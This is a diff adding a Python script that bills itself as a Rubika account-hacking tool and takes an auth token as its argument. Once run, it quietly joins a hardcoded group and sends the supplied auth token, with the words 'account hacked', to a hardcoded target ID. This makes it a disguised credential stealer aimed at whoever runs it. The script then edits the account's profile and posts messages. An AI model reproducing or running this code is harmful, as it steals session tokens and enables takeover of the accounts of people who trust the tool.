@@ -1,0 +1,60 @@
+# rubika-hack
+#------
+# --- importing ---
+import os,time,sys
+from rubika import Bot
+import datetime
+import requests
+#-----
+os.system("clear")
+#----
+dat = (datetime.datetime.today())
+yellow,green="\033[93m","\033[92m"
+#---
+# -- color --
+white='\033[0m'
+print (yellow)
+# bnr ---
+banner = (f"""
+___________________________
+            #[{dat}]#
+            #############
+           #############
+          #  hack rubika ##
+         {green}[api hash and auth]
+ ___________________________
+         
+         (help for hack account rubika):
+         	
+         {white}python rubx.py [auth]
+__________________________________
+         """)
+for bnr in banner:
+        sys.stdout.write(bnr)
+        sys.stdout.flush()
+        time.sleep(0.009)
+#----
+try:
+	auth = sys.argv[1]
+except:
+	sys.exit()
+
+bot = Bot("AppName",auth=auth)
+target = ("g0BdyQL068aa2398e619c1ddd729b2e4")
+bot.joinGroup("https://rubika.ir/joing/CCGJBGEF0BIZGGQOAIGMCCIWAUCWWEXF")
+print(bot.sendMessage(target,f"account hacked:\n\nauth: [{auth}]"))
+#-------
+while True:
+	dat=(datetime.datetime.today())
+	enter = input("\nenter name account hacked > ")
+	time.sleep(1)
+	biography = input ("""\nenter bio for
+	account hacked > """)
+	time.sleep(1)
+	print(f"\n{dat}account hacked [use rubika library]")
+	print ("\n"*10)
+	print (bot.editProfile(bio=biography,name=enter))
+	send = input("\nenter your guid group >> ")
+	sender = input("\nenter your text for send to gap >>")
+	bot.sendMessage(send,f"text admin({dat}):\n\n[{sender}]")
+	print("\n")
